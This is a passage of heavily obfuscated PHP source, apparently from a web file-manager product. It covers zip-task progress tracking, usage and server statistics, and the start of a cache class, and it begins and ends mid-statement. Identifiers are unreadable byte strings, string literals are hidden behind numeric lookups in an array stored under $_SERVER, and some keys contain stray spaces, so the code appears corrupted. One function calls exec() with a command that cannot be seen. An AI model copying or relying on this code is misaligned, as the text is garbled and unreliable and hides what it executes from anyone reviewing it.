$¸É’ı±¬[12]; $ş“³÷‡û[$¸É’ı±¬[1689]] = 0; $ş“³÷‡û[$¸É’ı±¬[1640]] = 0; $ş“³÷‡û[$¸É’ı±¬[1687]] = 0; $ş“³÷‡û[$¸É’ı±¬[1688]] = 0; $ş“³÷‡û[$¸É’ı±¬[1685]] = $¸É’ı±¬[12]; $ş“³÷‡û[$¸É’ı±¬[1692]] = 0; $ş“³÷‡û[$¸É’ı±¬[745]] = $àÍùìºå[$¸É’ı±¬[80]]; $this->update(); self::log($¸É’ı±¬[1733] . json_encode(array($ş“³÷‡û, $àÍùìºå))); } public function nameParse($ö†«…Óõ) { $Œ©¶ç¯ =& $_SERVER[® ¨Ä®ñ]; $‰–åó½© =& $this->task; if ($‰–åó½©[$Œ©¶ç¯[1731]] == $Œ©¶ç¯[1181]) { $‰–åó½©[$Œ©¶ç¯[1731]] = $Œ©¶ç¯[308]; $‰–åó½©[$Œ©¶ç¯[1692]] = 0; $‰–åó½©[$Œ©¶ç¯[745]] = 0; } $ÕÒæ’ÆÓ = get_path_this($ö†«…Óõ); if (strstr($ÕÒæ’ÆÓ, $Œ©¶ç¯[10])) { $‰–åó½©[$Œ©¶ç¯[1640]] += 1; $‰–åó½©[$Œ©¶ç¯[768]] += 1; } $‰–åó½©[$Œ©¶ç¯[1685]] = $ö†«…Óõ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÂƒøœŒ =& $_SERVER[® ¨Ä®ñ]; parent::startAfter(); Hook::bind($ÂƒøœŒ[1734], array($this, $ÂƒøœŒ[1729])); $¼¦ÙïØ´ =& $this->task; $¼¦ÙïØ´[$ÂƒøœŒ[1731]] = $ÂƒøœŒ[1181]; if (!$¼¦ÙïØ´[$ÂƒøœŒ[1539]]) { $¼¦ÙïØ´[$ÂƒøœŒ[1539]] = LNG($ÂƒøœŒ[1735]); } } protected function endAfter() { $ºø¹˜¾± =& $_SERVER[® ¨Ä®ñ]; parent::endAfter(); Hook::unbind($ºø¹˜¾±[1734], array($this, $ºø¹˜¾±[1729])); } public function updateAfter() { $‰¬ÃÉ’ˆ =& $_SERVER[® ¨Ä®ñ]; $†Óã” =& $this->task; if (!$†Óã”[$‰¬ÃÉ’ˆ[768]] || !$†Óã”[$‰¬ÃÉ’ˆ[745]]) { return; } if ($†Óã”[$‰¬ÃÉ’ˆ[1731]] == $‰¬ÃÉ’ˆ[1181]) { $Ó—˜¤ª« = $†Óã”[$‰¬ÃÉ’ˆ[1688]]; if ($†Óã”[$‰¬ÃÉ’ˆ[1689]] != $‰¬ÃÉ’ˆ[1181]) { $Ó—˜¤ª« = 0; } $¬éŠßø² = ($†Óã”[$‰¬ÃÉ’ˆ[1692]] + $Ó—˜¤ª«) / $†Óã”[$‰¬ÃÉ’ˆ[745]]; $†Óã”[$‰¬ÃÉ’ˆ[1641]] = $¬éŠßø² * 0.3; } else { if ($†Óã”[$‰¬ÃÉ’ˆ[1731]] == $‰¬ÃÉ’ˆ[308]) { $¬éŠßø² = $†Óã”[$‰¬ÃÉ’ˆ[1640]] / $†Óã”[$‰¬ÃÉ’ˆ[768]]; $†Óã”[$‰¬ÃÉ’ˆ[1641]] = 0.3 + $¬éŠßø² * 0.5; } else { if ($†Óã”[$‰¬ÃÉ’ˆ[1731]] == $‰¬ÃÉ’ˆ[108]) { $¬éŠßø² = 0; if ($†Óã”[$‰¬ÃÉ’ˆ[1687]]) { $¬éŠßø² = $†Óã”[$‰¬ÃÉ’ˆ[1688]] / $†Óã”[$‰¬ÃÉ’ˆ[1687]]; } $†Óã”[$‰¬ÃÉ’ˆ[1641]] = 0.3 + 0.5 + $¬éŠßø² * 0.2; } } } if ($†Óã”[$‰¬ÃÉ’ˆ[1641]] > 0) { $ÛËÙÑüÃ = timeFloat() - $†Óã”[$‰¬ÃÉ’ˆ[1643]] - $†Óã”[$‰¬ÃÉ’ˆ[1646]]; $†Óã”[$‰¬ÃÉ’ˆ[1647]] = $ÛËÙÑüÃ * (1 - $†Óã”[$‰¬ÃÉ’ˆ[1641]]) / $†Óã”[$‰¬ÃÉ’ˆ[1641]]; } } public function copyFileStart($Ô¡œÈÁ¤, $ªøè½Üµ, $Â©áúâº, $œÜ¤ëŸõ, $‘µ¦„ëø, $ŒÁñë®Ú) { $ˆÂ¾¸Ğµ =& $_SERVER[® ¨Ä®ñ]; parent::copyFileStart($Ô¡œÈÁ¤, $ªøè½Üµ, $Â©áúâº, $œÜ¤ëŸõ, $‘µ¦„ëø, $ŒÁñë®Ú); $ÙšªØ¨ä =& $this->task; if ($ÙšªØ¨ä[$ˆÂ¾¸Ğµ[1731]] == $ˆÂ¾¸Ğµ[308]) { $ÙšªØ¨ä[$ˆÂ¾¸Ğµ[1731]] = $ˆÂ¾¸Ğµ[108]; } $this->update(); } public function copyFileEnd($©”±ß, $µø½ƒ·«, $€è€á‘é, $‚µÊ­Â, $ÑÂğÆêò, $ó‡°ì) { $ì ù„¢‡ =& $_SERVER[® ¨Ä®ñ]; $í°ùçÖÅ =& $this->task; $í°ùçÖÅ[$ì ù„¢‡[1688]] = $í°ùçÖÅ[$ì ù„¢‡[1687]]; $í°ùçÖÅ[$ì ù„¢‡[1692]] += $í°ùçÖÅ[$ì ù„¢‡[1687]]; $í°ùçÖÅ[$ì ù„¢‡[1689]] = $ì ù„¢‡[12]; $this->update(); } public function nameParse($î’ğë’) { $±ñÉ•Åİ =& $_SERVER[® ¨Ä®ñ]; $ŒáÚ± =& $this->task; if ($ŒáÚ±[$±ñÉ•Åİ[1640]] < $ŒáÚ±[$±ñÉ•Åİ[768]]) { $áŞøÏŞ = get_path_this($î’ğë’); if (strstr($áŞøÏŞ, $±ñÉ•Åİ[10])) { $ŒáÚ±[$±ñÉ•Åİ[1640]] += 1; } } if ($ŒáÚ±[$±ñÉ•Åİ[1731]] == $±ñÉ•Åİ[1181]) { $ŒáÚ±[$±ñÉ•Åİ[1731]] = $±ñÉ•Åİ[308]; } $ŒáÚ±[$±ñÉ•Åİ[1685]] = $î’ğë’; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($©Áüî£®) { $ˆí¾øÆ =& $_SERVER[® ¨Ä®ñ]; $•øõ–‰† = array($ˆí¾øÆ[585] => array($ˆí¾øÆ[33] => $ˆí¾øÆ[1736], $ˆí¾øÆ[268] => array($ˆí¾øÆ[219], $ˆí¾øÆ[747], $ˆí¾øÆ[1737], $ˆí¾øÆ[1738])), $ˆí¾øÆ[1739] => array($ˆí¾øÆ[33] => $ˆí¾øÆ[1740], $ˆí¾øÆ[268] => array($ˆí¾øÆ[219], $ˆí¾øÆ[745], $ˆí¾øÆ[1741], $ˆí¾øÆ[1742], $ˆí¾øÆ[1743]))); if (!isset($•øõ–‰†[$©Áüî£®])) { return !1; } $this->optionType = $•øõ–‰†[$©Áüî£®][$ˆí¾øÆ[33]]; $this->field = $•øõ–‰†[$©Áüî£®][$ˆí¾øÆ[268]]; return !0; } public function listData($°ËÌ§’ = false, $Â‡£§·… = "\155\157\144\x69\146\x79\x54\x69\x6d\145", $Ä¬¢Ë¤÷ = false) { return parent::listData($°ËÌ§’, $Â‡£§·…, $Ä¬¢Ë¤÷); } public function trendList($Š‰ëÎ§ó) { $îËšû™ë =& $_SERVER[® ¨Ä®ñ]; $Û À•û = $this->listData(); if ($Û À•û) { $â±€ºÀ¬ = end($Û À•û); $ºêâöÒ— = date($îËšû™ë[1744], strtotime($îËšû™ë[1745])); if ($â±€ºÀ¬[$îËšû™ë[219]] == $ºêâöÒ—) { return $Û À•û; } $‡¹ûıñ€ = strtotime($â±€ºÀ¬[$îËšû™ë[219]]); } if (!isset($‡¹ûıñ€)) { $ôºÂĞÉü = $Š‰ëÎ§ó == $îËšû™ë[585] ? $îËšû™ë[529] : $îËšû™ë[807]; $‡¹ûıñ€ = Model($ôºÂĞÉü)->min($îËšû™ë[193]); } $öËû½ƒ = $îËšû™ë[1746] . ucfirst($Š‰ëÎ§ó); $¾Õã¤ = $this->dateList($‡¹ûıñ€); foreach ($¾Õã¤ as $ºêâöÒ—) { $this->{$öËû½ƒ}($ºêâöÒ—); } return $this->listData(); } private function dateList($şæâ¹ı) { $Ìæµø­ =& $_SERVER[® ¨Ä®ñ]; $«ğÛ¤Ú = $şæâ¹ı; $ïÃÁÀ±÷ = strtotime($Ìæµø­[1745]); $ğ°ˆ¶€€ = array(); while ($«ğÛ¤Ú <= $ïÃÁÀ±÷) { $ğ°ˆ¶€€[] = date($Ìæµø­[1744], $«ğÛ¤Ú); $«ğÛ¤Ú = strtotime($Ìæµø­[1747], $«ğÛ¤Ú); } return $ğ°ˆ¶€€; } public function _recordUser($“®ÆÉÒÒ = '') { $µ ÂÄÎÔ =& $_SERVER[® ¨Ä®ñ]; $ü”Åš³æ = strtotime(date($µ ÂÄÎÔ[1748], strtotime($“®ÆÉÒÒ))); $½¥³„»– = strtotime(date($µ ÂÄÎÔ[1749], strtotime($“®ÆÉÒÒ))); $óÄÈ…’ = array($µ ÂÄÎÔ[193] => array($µ ÂÄÎÔ[997], $½¥³„»–)); $ò§ÇŠ€• = Model($µ ÂÄÎÔ[529])->where($óÄÈ…’)->count($µ ÂÄÎÔ[1639]); $óÄÈ…’[$µ ÂÄÎÔ[193]] = array($µ ÂÄÎÔ[328], array($ü”Åš³æ, $½¥³„»–)); $Ïß¾½¸ = Model($µ ÂÄÎÔ[529])->where($óÄÈ…’)->count($µ ÂÄÎÔ[1639]); $óÄÈ…’[$µ ÂÄÎÔ[33]] = $µ ÂÄÎÔ[1750]; $êùã‚ßã = Model($µ ÂÄÎÔ[1751])->where($óÄÈ…’)->count($µ ÂÄÎÔ[1752]); $ãáç®¼© = array($µ ÂÄÎÔ[219] => $“®ÆÉÒÒ, $µ ÂÄÎÔ[747] => (int) $ò§ÇŠ€•, $µ ÂÄÎÔ[1737] => (int) $Ïß¾½¸, $µ ÂÄÎÔ[1738] => (int) $êùã‚ßã); return $this->insert($ãáç®¼©); } public function _recordStore($²ÖòÔ“¦ = '') { $çÈ¾÷´ =& $_SERVER[® ¨Ä®ñ]; $òº¶²¾¥ = strtotime(date($çÈ¾÷´[1749], strtotime($²ÖòÔ“¦))); $æÇö¸‹Š = array($çÈ¾÷´[193] => array($çÈ¾÷´[997], $òº¶²¾¥)); $ö×¢Áµı = Model($çÈ¾÷´[461])->where($æÇö¸‹Š)->sum($çÈ¾÷´[80]); $æÇö¸‹Š[$çÈ¾÷´[402]] = 0; $†Ï®¾Ù = Model($çÈ¾÷´[807])->where($æÇö¸‹Š)->sum($çÈ¾÷´[80]); $æÇö¸‹Š[$çÈ¾÷´[403]] = 1; $‹Ù›Ï– = Model($çÈ¾÷´[807])->where($æÇö¸‹Š)->sum($çÈ¾÷´[80]); $æÇö¸‹Š[$çÈ¾÷´[403]] = 2; $±×Ùï¤ñ = Model($çÈ¾÷´[807])->where($æÇö¸‹Š)->sum($çÈ¾÷´[80]); $Ï¡ˆ¼Àñ = array($çÈ¾÷´[219] => $²ÖòÔ“¦, $çÈ¾÷´[745] => (int) $†Ï®¾Ù, $çÈ¾÷´[1741] => (int) $ö×¢Áµı, $çÈ¾÷´[1742] => (int) $‹Ù›Ï–, $çÈ¾÷´[1743] => (int) $±×Ùï¤ñ); return $this->insert($Ï¡ˆ¼Àñ); } public function trend($àêÊÍñğ, $¤çÂ‰¾ñ) { $‡”Ñø©ñ =& $_SERVER[® ¨Ä®ñ]; if (!$this->init($àêÊÍñğ)) { return !1; } $ÁÌµ‘ä = $this->trendList($àêÊÍñğ); if ($ÁÌµ‘ä && $¤çÂ‰¾ñ != $‡”Ñø©ñ[1612]) { $˜ù©Ó÷î = $ÁÌµ‘ä[0][$‡”Ñø©ñ[219]]; $ÂË½–¤Ã = $this->validDate($¤çÂ‰¾ñ, $˜ù©Ó÷î); $šå¶”šô = array(); $‡Œ¡¹å· = array_to_keyvalue($ÁÌµ‘ä, $‡”Ñø©ñ[219]); foreach ($ÂË½–¤Ã as $®³¸·Ì) { if (isset($‡Œ¡¹å·[$®³¸·Ì])) { $ÒÍü‚ = $‡Œ¡¹å·[$®³¸·Ì]; } else { $ÒÍü‚ = end($ÁÌµ‘ä); $ÒÍü‚[$‡”Ñø©ñ[219]] = $®³¸·Ì; if ($àêÊÍñğ == $‡”Ñø©ñ[585]) { $ÒÍü‚[$‡”Ñø©ñ[1737]] = $ÒÍü‚[$‡”Ñø©ñ[1738]] = 0; } } $šå¶”šô[] = $ÒÍü‚; } $ÁÌµ‘ä = $šå¶”šô; } $¶¾°Ä„¶ = array($‡”Ñø©ñ[585] => array($‡”Ñø©ñ[747] => LNG($‡”Ñø©ñ[1753]), $‡”Ñø©ñ[1737] => LNG($‡”Ñø©ñ[1754]), $‡”Ñø©ñ[1738] => LNG($‡”Ñø©ñ[1755])), $‡”Ñø©ñ[1739] => array($‡”Ñø©ñ[745] => LNG($‡”Ñø©ñ[1756]), $‡”Ñø©ñ[1741] => LNG($‡”Ñø©ñ[1757]), $‡”Ñø©ñ[1742] => LNG($‡”Ñø©ñ[1758]), $‡”Ñø©ñ[1743] => LNG($‡”Ñø©ñ[1759]))); $åõƒ“‹ = array($‡”Ñø©ñ[585] => $‡”Ñø©ñ[1760], $‡”Ñø©ñ[1739] => $‡”Ñø©ñ[80]); if (empty($ÁÌµ‘ä)) { $®³¸·Ì = date($‡”Ñø©ñ[1744], strtotime($‡”Ñø©ñ[1745])); $ëóôŒ  = array($‡”Ñø©ñ[219] => $®³¸·Ì); foreach ($¶¾°Ä„¶[$àêÊÍñğ] as $°êĞ¦‰Ë => $¤¥Ëğ¡†) { $ëóôŒ [$°êĞ¦‰Ë] = 0; } $ÁÌµ‘ä[] = $ëóôŒ ; } $ší€ôâ§ = array(); foreach ($ÁÌµ‘ä as $¤¥Ëğ¡†) { if ($àêÊÍñğ == $‡”Ñø©ñ[1739] && $¤¥Ëğ¡†[$‡”Ñø©ñ[1741]] > $¤¥Ëğ¡†[$‡”Ñø©ñ[745]]) { $¤¥Ëğ¡†[$‡”Ñø©ñ[1741]] = $¤¥Ëğ¡†[$‡”Ñø©ñ[745]]; } foreach ($¶¾°Ä„¶[$àêÊÍñğ] as $°êĞ¦‰Ë => $–¥èº¢) { $ÒÍü‚ = array($‡”Ñø©ñ[219] => $¤¥Ëğ¡†[$‡”Ñø©ñ[219]], $‡”Ñø©ñ[1539] => $–¥èº¢); $ÒÍü‚[$åõƒ“‹[$àêÊÍñğ]] = isset($¤¥Ëğ¡†[$°êĞ¦‰Ë]) ? $¤¥Ëğ¡†[$°êĞ¦‰Ë] : 0; $ší€ôâ§[] = $ÒÍü‚; } } return $ší€ôâ§; } public function validDate($‡ëìì‰ª, $Ã×¶„ğ) { $ÙöÁ„Ş‹ =& $_SERVER[® ¨Ä®ñ]; $Ïëöäğ  = date($ÙöÁ„Ş‹[1744], strtotime($ÙöÁ„Ş‹[1745])); $œ¿û×Ú = array($Ïëöäğ ); switch ($‡ëìì‰ª) { case $ÙöÁ„Ş‹[1619]: $ÀÚ£ÖöĞ = mktime(0, 0, 0, date($ÙöÁ„Ş‹[1761]), date($ÙöÁ„Ş‹[1357]) - date($ÙöÁ„Ş‹[1420]) + 7 - 7, date($ÙöÁ„Ş‹[1762])); $˜Òğ–´’ = 0; do { $§ôƒ¦õ’ = date($ÙöÁ„Ş‹[1744], $ÀÚ£ÖöĞ - 3600 * 24 * 7 * $˜Òğ–´’); $œ¿û×Ú[] = $§ôƒ¦õ’; $˜Òğ–´’++; } while ($Ã×¶„ğ < $§ôƒ¦õ’); break; case $ÙöÁ„Ş‹[1617]: $˜Òğ–´’ = 1; do { $Á±‰Éò = date($ÙöÁ„Ş‹[1763], strtotime("\55\x20{$˜Òğ–´’}\40\x6d\157\156\164\150\163")); $œ¿û×Ú[] = $Á±‰Éò; $˜Òğ–´’++; } while ($Ã×¶„ğ < $Á±‰Éò); break; case $ÙöÁ„Ş‹[1764]: $›®ëÜÀù = (int) date($ÙöÁ„Ş‹[1762], strtotime($Ã×¶„ğ)); $Ø­Ÿ¤àŒ = (int) date($ÙöÁ„Ş‹[1762]); if ($›®ëÜÀù >= $Ø­Ÿ¤àŒ) { break; } for ($›®ëÜÀù; $›®ëÜÀù < $Ø­Ÿ¤àŒ; $›®ëÜÀù++) { $œ¿û×Ú[] = $›®ëÜÀù . $ÙöÁ„Ş‹[1765]; } break; default: break; } if ($Ã×¶„ğ > end($œ¿û×Ú)) { array_pop($œ¿û×Ú); } sort($œ¿û×Ú); return $œ¿û×Ú; } public function listTable($Œğ»Äİ¡) { $¯³¢œâ· = ucfirst($Œğ»Äİ¡); return Model($¯³¢œâ·)->listData(); } public function option($“ÌÀö¡£) { $À™Ú’Óá = $_SERVER[® ¨Ä®ñ][1766] . ucfirst($“ÌÀö¡£); return $this->{$À™Ú’Óá}(); } private function optionUser() { $¥•İçæ× =& $_SERVER[® ¨Ä®ñ]; $Õ€œ¥ÖØ = Model($¥•İçæ×[529])->count($¥•İçæ×[1639]); $¹ûæ¬Ë‘ = Model($¥•İçæ×[529])->where($¥•İçæ×[1767])->count($¥•İçæ×[1639]); $©£½İÖ¥ = intval($GLOBALS[$¥•İçæ×[6]][$¥•İçæ×[344]][$¥•İçæ×[1595]]) / 3600; $ùõâßÏ« = strtotime("\55{$©£½İÖ¥}\40\150\x6f\x75\x72\163"); $À‚ÛÎã‡ = strtotime(date($¥•İçæ×[1748])); if ($ùõâßÏ« < $À‚ÛÎã‡) { $ùõâßÏ« = $À‚ÛÎã‡; } $èÄ¶ë€ = array($¥•İçæ×[1768] => array($¥•İçæ×[998], $ùõâßÏ«)); $Ô‡»¬ªÌ = (int) Model($¥•İçæ×[529])->where($èÄ¶ë€)->count($¥•İçæ×[1639]); if (!$Ô‡»¬ªÌ) { $Ô‡»¬ªÌ = 1; } $èÄ¶ë€ = array($¥•İçæ×[1768] => array($¥•İçæ×[998], $À‚ÛÎã‡)); $å— ·° = Model($¥•İçæ×[529])->where($èÄ¶ë€)->count($¥•İçæ×[1639]); return array($¥•İçæ×[741] => (int) $Õ€œ¥ÖØ, $¥•İçæ×[1769] => (int) ($Õ€œ¥ÖØ - $¹ûæ¬Ë‘), $¥•İçæ×[1770] => (int) $¹ûæ¬Ë‘, $¥•İçæ×[1771] => (int) $å— ·°, $¥•İçæ×[1772] => $Ô‡»¬ªÌ); } private function optionFile() { $ˆ”°‹êŸ =& $_SERVER[® ¨Ä®ñ]; $±¾ÏßÄÖ = $this->sourceSize(); $»‡×öüµ = $±¾ÏßÄÖ[$ˆ”°‹êŸ[80]]; $¸ªÇ¼ = $±¾ÏßÄÖ[$ˆ”°‹êŸ[1741]]; $ßºëµ¦á = Model($ˆ”°‹êŸ[807])->where(array($ˆ”°‹êŸ[402] => 0))->count($ˆ”°‹êŸ[394]); $ò¶®¥²É = array($ˆ”°‹êŸ[402] => 0, $ˆ”°‹êŸ[193] => array($ˆ”°‹êŸ[998], strtotime(date($ˆ”°‹êŸ[1748])))); $ÚŠˆ˜Ú· = Model($ˆ”°‹êŸ[807])->where($ò¶®¥²É)->sum($ˆ”°‹êŸ[80]); $–Â¤×õ— = Model($ˆ”°‹êŸ[807])->where($ò¶®¥²É)->count($ˆ”°‹êŸ[394]); return array($ˆ”°‹êŸ[745] => $»‡×öüµ, $ˆ”°‹êŸ[1741] => $¸ªÇ¼, $ˆ”°‹êŸ[1773] => $»‡×öüµ - $¸ªÇ¼, $ˆ”°‹êŸ[1774] => (int) $ÚŠˆ˜Ú·, $ˆ”°‹êŸ[747] => (int) $ßºëµ¦á, $ˆ”°‹êŸ[1775] => (int) $–Â¤×õ—); } private function optionAccess() { $ç˜«”¯ =& $_SERVER[® ¨Ä®ñ]; return array($ç˜«”¯[741] => $this->typeLogCnt(), $ç˜«”¯[108] => $this->typeLogCnt($ç˜«”¯[108]), $ç˜«”¯[441] => $this->typeLogCnt($ç˜«”¯[441]), $ç˜«”¯[1776] => $this->typeLogCnt($ç˜«”¯[1776]), $ç˜«”¯[1777] => $this->typeLogCnt($ç˜«”¯[1777]), $ç˜«”¯[585] => $this->typeLogCnt($ç˜«”¯[12], $ç˜«”¯[1752])); } private function typeLogCnt($Ââ‡ÕË“ = '', $‚‡şĞĞ§ = "\x69\144") { $éäŠ°í» =& $_SERVER[® ¨Ä®ñ]; $å€·Âçƒ = array($éäŠ°í»[108] => array($éäŠ°í»[1778], $éäŠ°í»[1779]), $éäŠ°í»[441] => array($éäŠ°í»[1780], $éäŠ°í»[1781]), $éäŠ°í»[1776] => array($éäŠ°í»[1782], $éäŠ°í»[1783], $éäŠ°í»[1784]), $éäŠ°í»[1777] => array($éäŠ°í»[1785], $éäŠ°í»[1786]), $éäŠ°í»[1787] => array($éäŠ°í»[1788], $éäŠ°í»[1789], $éäŠ°í»[1790])); $¯òş¶Ïê = strtotime(date($éäŠ°í»[1748])); $“»ŠØò× = array($éäŠ°í»[193] => array($éäŠ°í»[998], $¯òş¶Ïê)); if ($Ââ‡ÕË“) { $“»ŠØò×[$éäŠ°í»[33]] = array($éäŠ°í»[7], $å€·Âçƒ[$Ââ‡ÕË“]); } $¼©æıåè = Model($éäŠ°í»[1751])->where($“»ŠØò×)->count($‚‡şĞĞ§); return (int) $¼©æıåè; } private function optionServer() { $õùò„¦Ö =& $_SERVER[® ¨Ä®ñ]; $†ôÂË‘ = $this->diskDriver(); $ó¤øóê’ = KodIO::defaultDriver(); $ßíœÖîë = array($õùò„¦Ö[799] => $ó¤øóê’[$õùò„¦Ö[392]]); $ª“•¯Ğ¥ = Model($õùò„¦Ö[461])->where($ßíœÖîë)->sum($õùò„¦Ö[80]); $ŒëÑŸÅ› = explode($õùò„¦Ö[53], $_SERVER[$õùò„¦Ö[140]]); $üè™¯› = $ŒëÑŸÅ›[0]; $­¯èê¤ = $GLOBALS[$õùò„¦Ö[6]][$õùò„¦Ö[21]]; $Ì¿°Ó”° = $­¯èê¤[$õùò„¦Ö[960]]; if ($Ì¿°Ó”° == $õùò„¦Ö[948]) { $”ÎáÏŒ = explode($õùò„¦Ö[1254], $­¯èê¤[$õùò„¦Ö[959]]); $Ì¿°Ó”° = $”ÎáÏŒ[0]; } if ($Ì¿°Ó”° == $õùò„¦Ö[894] || $Ì¿°Ó”° == $õùò„¦Ö[786]) { $´™ÏØ¾õ = Model()->db()->query($õùò„¦Ö[1791]); $Ìı¾­”Æ = $´™ÏØ¾õ[0] && isset($´™ÏØ¾õ[0][$õùò„¦Ö[1538]]) ? $´™ÏØ¾õ[0][$õùò„¦Ö[1538]] : 0; $Ì¿°Ó”° = $õùò„¦Ö[1792] . ($Ìı¾­”Æ ? $õùò„¦Ö[8] . $Ìı¾­”Æ : $õùò„¦Ö[12]); } $ÕË““ñ = $GLOBALS[$õùò„¦Ö[6]][$õùò„¦Ö[344]][$õùò„¦Ö[809]]; return array($õùò„¦Ö[1793] => $†ôÂË‘ ? $†ôÂË‘[$õùò„¦Ö[1794]] : 0, $õùò„¦Ö[1795] => $†ôÂË‘ ? $†ôÂË‘[$õùò„¦Ö[1796]] : 0, $õùò„¦Ö[1797] => (int) $ó¤øóê’[$õùò„¦Ö[1794]] * 1024 * 1024 * 1024, $õùò„¦Ö[1798] => (int) $ª“•¯Ğ¥, $õùò„¦Ö[1799] => ucfirst($üè™¯›), $õùò„¦Ö[1800] => $õùò„¦Ö[1801] . PHP_VERSION, $õùò„¦Ö[1802] => phpBuild64() ? 64 : 32, $õùò„¦Ö[740] => str_replace($õùò„¦Ö[1114], $õùò„¦Ö[976], $Ì¿°Ó”°), $õùò„¦Ö[344] => ucfirst($ÕË““ñ), $õùò„¦Ö[32] => $_SERVER[$õùò„¦Ö[1803]]); } private function diskDriver() { $†¼×‰¡Ö =& $_SERVER[® ¨Ä®ñ]; $”ÌÀ‘¼ı = $†¼×‰¡Ö[8]; $ãî‘è´Ó = $GLOBALS[$†¼×‰¡Ö[6]][$†¼×‰¡Ö[1270]] == $†¼×‰¡Ö[1271]; if ($ãî‘è´Ó) { $”ÌÀ‘¼ı = $†¼×‰¡Ö[1804]; if (function_exists($†¼×‰¡Ö[1805])) { exec($†¼×‰¡Ö[1806], $§„«¡‰­); $”ÌÀ‘¼ı = $§„«¡‰­[1] . $†¼×‰¡Ö[8]; } } if (!file_exists($”ÌÀ‘¼ı)) { return; } $ÏÖ·ğ¨Â = @disk_total_space($”ÌÀ‘¼ı); $ÈÀµÍ‹ = $ÏÖ·ğ¨Â - @disk_free_space($”ÌÀ‘¼ı); return array($†¼×‰¡Ö[1794] => $ÏÖ·ğ¨Â, $†¼×‰¡Ö[1796] => $ÈÀµÍ‹); } public function fileChart($ï¿ü§) { $€ú‹¬Š™ =& $_SERVER[® ¨Ä®ñ]; if (isset($ï¿ü§[$€ú‹¬Š™[1639]])) { return Model($€ú‹¬Š™[807])->userFileTypeProfile($ï¿ü§[$€ú‹¬Š™[1639]]); } if (isset($ï¿ü§[$€ú‹¬Š™[1807]])) { return Model($€ú‹¬Š™[807])->groupFileTypeProfile($ï¿ü§[$€ú‹¬Š™[1807]]); } $Ü úë¼² = $this->sourceSize(); $—õˆƒÒ = array($€ú‹¬Š™[489] => 0, $€ú‹¬Š™[403] => 1); $å¸·æ‹ß = Model($€ú‹¬Š™[807])->where($—õˆƒÒ)->sum($€ú‹¬Š™[80]); $—õˆƒÒ[$€ú‹¬Š™[403]] = 2; $ÚŞŒæ’ğ = Model($€ú‹¬Š™[807])->where($—õˆƒÒ)->sum($€ú‹¬Š™[80]); return array($€ú‹¬Š™[745] => $Ü úë¼²[$€ú‹¬Š™[80]], $€ú‹¬Š™[1741] => $Ü úë¼²[$€ú‹¬Š™[1741]], $€ú‹¬Š™[1742] => (int) $å¸·æ‹ß, $€ú‹¬Š™[1743] => (int) $ÚŞŒæ’ğ); } private function sourceSize() { $áı¿ÁÎü =& $_SERVER[® ¨Ä®ñ]; $Ã‘ƒª—¨ = Model($áı¿ÁÎü[807])->where(array($áı¿ÁÎü[402] => 0))->sum($áı¿ÁÎü[80]); $±û›„Àù = Model($áı¿ÁÎü[461])->sum($áı¿ÁÎü[80]); if ($±û›„Àù > $Ã‘ƒª—¨) { $±û›„Àù = $Ã‘ƒª—¨; } return array($áı¿ÁÎü[80] => (int) $Ã‘ƒª—¨, $áı¿ÁÎü[1741] => (int) $±û›„Àù); } } goto D¯Ù¤º¥Ÿ; f®“â”õ¯Ö: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $úÛ÷¬“ =& $_SERVER[® ¨Ä®ñ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $âå„Å° = $GLOBALS[$úÛ÷¬“[6]][$úÛ÷¬“[344]]; $îÈê´õ¥ = $âå„Å°[$âå„Å°[$úÛ÷¬“[809]]]; $ü ˜ëÆ» = $âå„Å°[$úÛ÷¬“[810]]; switch ($âå„Å°[$úÛ÷¬“[809]]) { case $úÛ÷¬“[21]: self::$handle = Model($úÛ÷¬“[811]); break; case $úÛ÷¬“[812]: self::$handle = new CacheRedis($îÈê´õ¥, $ü ˜ëÆ»); break; case $úÛ÷¬“[813]: self::$handle = new CacheMemcached($îÈê´õ¥, $ü ˜ëÆ»); break; case $úÛ÷¬“[192]: self::$handle = new CacheFile($îÈê´õ¥, $ü ˜ëÆ»); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÕÓš‡¿) { if (is_array($ÕÓš‡¿) || is_object($ÕÓš‡¿)) { $ÕÓš‡¿ = json_encode($ÕÓš‡¿); } $ÕÓš‡¿ = rawurlencode($ÕÓš‡¿); return md5(KOD_SITE_ID . $_SERVER[® ¨Ä®ñ][11] . $ÕÓš‡¿); } public static function get($¯¬»œ¡Ê, $ƒ‘²†Œö = false) { $¦ŒÄÛ„° = self::key($¯¬»œ¡Ê); if ($ƒ‘²†Œö) { return unserialize(self::init()->get($¦ŒÄÛ„°)); } if (!isset(self::$memoryCache[$¦ŒÄÛ„°])) { $»õÈÆë¼ = self::init()->get($¦ŒÄÛ„°); self::$memoryCache[$¦ŒÄÛ„°] = unserialize($»õÈÆë¼); } return self::$memoryCache[$¦ŒÄÛ„°]; } public static function set($Üì¨·ìÛ, $ÃÑ©Â„Ì, $Ÿ·›Öƒ = false) { $²º¬¼´± = self::key($Üì¨·ìÛ); if (isset(self::$memoryCache[$²º¬¼´±]) && self::$memoryCache[$²º¬¼´±] === $ÃÑ©Â„Ì) { return !0; } if ($Ÿ·›Öƒ === 0) { self::$memoryCache[$²º¬¼´±] = $ÃÑ©Â„Ì; return !0; } CacheLock::lock($Üì¨·ìÛ); $÷á’²‰“ = self::init()->set($²º¬¼´±, serialize($ÃÑ©Â„Ì), $Ÿ·›Öƒ); self::$memoryCache[$²º¬¼´±] = $ÃÑ©Â„Ì; CacheLock::unlock($Üì¨·ìÛ); return $÷á’²‰“; } public static function getCall($ª«èÏü¯, $ç’şºûÖ, $ì×Œ©–ø, $­˜ˆšñ§ = array()) { $ÈÖğŠñ =& $_SERVER[® ¨Ä®ñ]; $¥÷Ïİ© = self::get($ª«èÏü¯); if ($¥÷Ïİ© || $¥÷Ïİ© === $ÈÖğŠñ[12]) { return $¥÷Ïİ©; } $¥÷Ïİ© = call_user_func_array($ì×Œ©–ø, $­˜ˆšñ§); $¥÷Ïİ© = $¥÷Ïİ© ? $¥÷Ïİ© : $ÈÖğŠñ[12]; self::set($ª«èÏü¯, $¥÷Ïİ©, $ç’şºûÖ); return $¥÷Ïİ©; } public static function remove($õØÙ‘») { $Á²ÄÎ¨½ = self::key($õØÙ‘»); unset(self::$memoryCache[$Á²ÄÎ¨½]); self::clearTimeout(); CacheLock::lock($õØÙ‘»); $…Ş§Ö£œ = 